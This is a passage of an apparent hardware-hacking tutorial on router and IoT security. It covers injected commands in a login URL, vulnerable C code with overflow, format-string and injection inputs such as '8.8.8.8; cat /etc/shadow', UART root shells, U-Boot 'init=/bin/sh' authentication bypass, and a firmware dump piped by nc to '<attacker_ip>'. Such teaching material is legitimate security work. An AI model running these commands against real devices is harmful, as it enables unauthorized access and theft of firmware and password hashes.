class="token comment" style="color:#999988;font-style:italic"># http://router.ip/cgi-bin/login.cgi?username=admin;reboot;&amp;password=pass</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Result: Router reboots due to injected &quot;reboot&quot; command</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="binary-analysis">Binary Analysis<a href="#binary-analysis" class="hash-link" aria-label="Direct link to Binary Analysis" title="Direct link to Binary Analysis" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="analyzing-embedded-binaries">Analyzing Embedded Binaries<a href="#analyzing-embedded-binaries" class="hash-link" aria-label="Direct link to Analyzing Embedded Binaries" title="Direct link to Analyzing Embedded Binaries" translate="no">​</a></h3>
<p><strong>Common binary types:</strong></p>
<ul>
<li class=""><strong>BusyBox:</strong> Single binary with multiple utilities (ls, cat, wget, etc.)</li>
<li class=""><strong>Custom daemons:</strong> httpd, telnetd, dropbear (SSH), etc.</li>
<li class=""><strong>Proprietary applications:</strong> Vendor-specific services</li>
</ul>
<p><strong>Disassembly tools:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># For ARM/MIPS binaries, use:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Ghidra (supports ARM, MIPS, PowerPC)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - IDA Pro (commercial, excellent ARM/MIPS support)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Radare2 (free, supports many architectures)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: Analyze httpd binary in Ghidra</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. Load bin/httpd in Ghidra</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Select architecture: ARM:LE:32:v7 (or MIPS:LE:32:default)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Analyze with default settings</span><br></span></code></pre></div></div>
<p><strong>Finding vulnerabilities in binaries:</strong></p>
<p><strong>1. Stack buffer overflows:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable code (decompiled from httpd):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">handle_request</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">request</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">256</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> request</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// No bounds checking!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">process_request</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Exploitation: Send request &gt; 256 bytes to overflow buffer</span><br></span></code></pre></div></div>
<p><strong>2. Format string vulnerabilities:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable code:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">log_message</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">user_input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">syslog</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LOG_INFO</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> user_input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// User input directly in format string!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Exploitation:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Input: &quot;%x %x %x %x&quot; -&gt; Leak stack memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Input: &quot;%n&quot; -&gt; Write to arbitrary memory</span><br></span></code></pre></div></div>
<p><strong>3. Command injection:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Vulnerable code (CGI script analysis):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ping_host</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">ip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> cmd</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">512</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">sprintf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ping -c 1 %s&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> ip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Unsanitized input!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Exploitation:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Input: &quot;8.8.8.8; cat /etc/shadow&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Executed command: &quot;ping -c 1 8.8.8.8; cat /etc/shadow&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cross-compilation-for-testing">Cross-Compilation for Testing<a href="#cross-compilation-for-testing" class="hash-link" aria-label="Direct link to Cross-Compilation for Testing" title="Direct link to Cross-Compilation for Testing" translate="no">​</a></h3>
<p><strong>Set up cross-compiler:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install ARM cross-compiler (for ARM targets):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> gcc-arm-linux-gnueabi g++-arm-linux-gnueabi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Compile exploit:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">arm-linux-gnueabi-gcc exploit.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> exploit </span><span class="token parameter variable" style="color:#36acaa">-static</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Install MIPS cross-compiler (for MIPS targets):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> gcc-mipsel-linux-gnu g++-mipsel-linux-gnu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Compile for MIPS:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mipsel-linux-gnu-gcc exploit.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> exploit </span><span class="token parameter variable" style="color:#36acaa">-static</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="hardware-interfaces">Hardware Interfaces<a href="#hardware-interfaces" class="hash-link" aria-label="Direct link to Hardware Interfaces" title="Direct link to Hardware Interfaces" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="uart-universal-asynchronous-receivertransmitter">UART (Universal Asynchronous Receiver/Transmitter)<a href="#uart-universal-asynchronous-receivertransmitter" class="hash-link" aria-label="Direct link to UART (Universal Asynchronous Receiver/Transmitter)" title="Direct link to UART (Universal Asynchronous Receiver/Transmitter)" translate="no">​</a></h3>
<p><strong>UART</strong> is a serial debug console, often exposed on PCB test points.</p>
<p><strong>Finding UART pins:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Visual inspection:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Look for 3-4 pins labeled: TX, RX, GND, (VCC)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Often located near main processor or edge of PCB</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common UART pin configurations:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4-pin: VCC, TX, RX, GND</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3-pin: TX, RX, GND (most common)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Pin identification (if not labeled):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 1. GND: Use multimeter continuity test to ground (e.g., USB shield)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. VCC: Measure voltage with multimeter (3.3V or 5V when device powered)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. TX: Voltage fluctuates during boot (transmits data)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4. RX: Voltage stable (receives data, safe to probe)</span><br></span></code></pre></div></div>
<p><strong>UART connection:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Hardware required:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - USB-to-UART adapter (FTDI FT232, CP2102, PL2303)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Jumper wires</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Multimeter (to identify pins)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Wiring (device UART to USB adapter):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Device TX  -&gt; Adapter RX</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Device RX  -&gt; Adapter TX</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Device GND -&gt; Adapter GND</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># (Do NOT connect VCC unless necessary - power device separately)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Determine baud rate (common: 115200, 57600, 38400, 9600)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Try common baud rates in minicom/screen</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Linux: Connect via screen</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">screen</span><span class="token plain"> /dev/ttyUSB0 </span><span class="token number" style="color:#36acaa">115200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or use minicom:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> minicom </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> /dev/ttyUSB0 </span><span class="token parameter variable" style="color:#36acaa">-b</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">115200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Windows: Use PuTTY or TeraTerm</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Serial, COM3, 115200 baud, 8N1</span><br></span></code></pre></div></div>
<p><strong>UART baud rate detection (if unknown):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Use logic analyzer or oscilloscope to measure bit timing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or try common rates:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:#36acaa">baud</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9600</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">19200</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">38400</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">57600</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">115200</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">230400</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Trying baud rate: </span><span class="token string variable" style="color:#36acaa">$baud</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">screen</span><span class="token plain"> /dev/ttyUSB0 </span><span class="token variable" style="color:#36acaa">$baud</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># Press Enter, look for readable output</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># Ctrl+A, K to exit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">done</span><br></span></code></pre></div></div>
<p><strong>UART shell access:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Best case: Get root shell directly</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Output during boot:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># BusyBox v1.28.4 (2023-01-01 12:00:00 UTC) built-in shell (ash)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Enter &#x27;help&#x27; for a list of built-in commands.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># / #  (root shell!)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Commands to run:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /proc/cpuinfo       </span><span class="token comment" style="color:#999988;font-style:italic"># CPU architecture</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /proc/mtd           </span><span class="token comment" style="color:#999988;font-style:italic"># Flash partitions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /proc/cmdline       </span><span class="token comment" style="color:#999988;font-style:italic"># Kernel boot parameters</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ifconfig</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic"># Network configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux                  </span><span class="token comment" style="color:#999988;font-style:italic"># Running processes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/passwd         </span><span class="token comment" style="color:#999988;font-style:italic"># User accounts</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> /etc/shadow         </span><span class="token comment" style="color:#999988;font-style:italic"># Password hashes (if readable)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Dump firmware from UART:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/mtd0 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">lt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">attacker_ip</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">gt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><br></span></code></pre></div></div>
<p><strong>Bypassing authentication (if UART is password-protected):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Method 1: Interrupt bootloader (U-Boot)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Power on device, press Ctrl+C or Enter repeatedly during boot</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Drop into U-Boot shell:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># U-Boot&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Common U-Boot commands:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">printenv</span><span class="token plain">                </span><span class="token comment" style="color:#999988;font-style:italic"># Show environment variables</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setenv bootargs </span><span class="token string" style="color:#e3116c">&quot;init=/bin/sh&quot;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Boot directly to shell (bypass init)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot                    </span><span class="token comment" style="color:#999988;font-style:italic"># Boot with modified parameters</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Method 2: Edit kernel cmdline</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setenv bootargs </span><span class="token string" style="color:#e3116c">&quot;console=ttyS0,115200 init=/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">saveenv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Method 3: Single-user mode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setenv bootargs </span><span class="token string" style="color:#e3116c">&quot;console=ttyS0,115200 single&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="jtag-joint-test-action-group">JTAG (Joint Test Action Group)<a href="#jtag-joint-test-action-group" class="hash-link" aria-label="Direct link to JTAG (Joint Test Action Group)" title="Direct link to JTAG (Joint Test Action Group)" translate="no">​</a></h3>
<p><strong>JTAG</strong> is a hardware debugging interface (more powerful than UART).</p>
<p><strong>JTAG capabilities:</strong></p>
<ul>
